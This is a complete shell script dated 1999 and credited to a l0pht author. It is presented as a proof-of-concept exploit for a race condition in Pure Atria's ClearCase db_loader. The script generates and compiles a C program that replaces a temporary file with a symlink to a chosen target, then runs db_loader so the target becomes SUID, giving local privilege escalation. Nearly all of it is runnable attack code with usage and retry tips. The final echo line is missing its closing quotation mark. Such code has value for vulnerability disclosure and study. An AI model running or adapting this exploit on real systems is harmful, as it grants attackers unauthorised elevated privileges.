#!/bin/sh
#
# This is sample code that takes advantage of a race condition in 
# Pure Atria's Clear Case db_loader program. The program will retain
# ownership of the file pointed to on the command line and have
# the clear case db_loader change the permissions to SUID
#  .mudge@l0pht.com  2.5.1999
#
RACE_PROG=./clear_race
RACE_CODE=./clear_race.c
# you probabaly need to change the following to reflect your
# system and setup
#NICE=/usr/bin/nice
CC=/usr/local/bin/gcc
DB_LOADER=/usr/atria/sun5/etc/db_loader
RM=/bin/rm
LS=/bin/ls
MKDIR=/bin/mkdir
# you need to own the DEST DIR so you can delete files that you don't
# directly own
DEST_DIR=/var/tmp/cleartest.$$

if [ "$#" -ne "1" ] ; then
  echo "usage: `basename $0` file_to_make_suid"
  exit
fi

TARGET=$1

if [ ! -f ${TARGET} ] ; then
  echo "target file must exist"
  exit
fi

echo
echo "Clear Case proof of concept exploit code - mudge@l0pht.com 2.5.1999"
echo " one beer please!"
echo

${MKDIR} ${DEST_DIR}
if [ $? -gt 0 ] ; then
  echo "go get rid of ${DEST_DIR} and try again..."
  exit
fi

cd ${DEST_DIR}

# create the race runner
echo "creating race grinder...."
cat > ${RACE_CODE} << FOEFOE
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>

main(int argc, char *argv[])
{
  struct stat statbuf;

  printf("%d\n", argc);

  if (argc != 2){
    printf("bzzzzt! - wrong usage\n");
    exit(0);
  }

  while (1){
    if (stat("./db_dumper", &statbuf) == 0){
      unlink("./db_dumper");
      symlink(argv[1], "./db_dumper");
      exit(0);
    }
  }
}
FOEFOE
echo "created!"
echo

# compile it
echo "compiling race grinder..."
${CC} -O2 -o ${RACE_PROG} ${RACE_CODE}

if [ ! -f ${RACE_PROG} ] ; then
  echo "compile failed?"
  ${RM} -f ${RACE_CODE}
  exit
fi

echo "compiled! Launching attack.... be patient"
echo


${RACE_PROG} ${TARGET} &
# let us give the progie a second or two to load up and get the runtime
# crap set
sleep 2 

#${NICE} -n 2 ${DB_LOADER} ${DEST_DIR} > /dev/null 2>&1
# if you keep failing try the above and potentially increase the nice value
${DB_LOADER} ${DEST_DIR} > /dev/null 2>&1

if [ -u ${TARGET} ] ; then
  echo "Looks succesfull!"
  ${LS} -l ${TARGET}
  echo
  echo "don't forget to get rid of ${DEST_DIR}"
  echo
  exit
fi

echo "doesn't look like it worked... "
echo "try again - after all it's a race condition!"
echo "don't forget to get rid of ${DEST_DIR}
echo








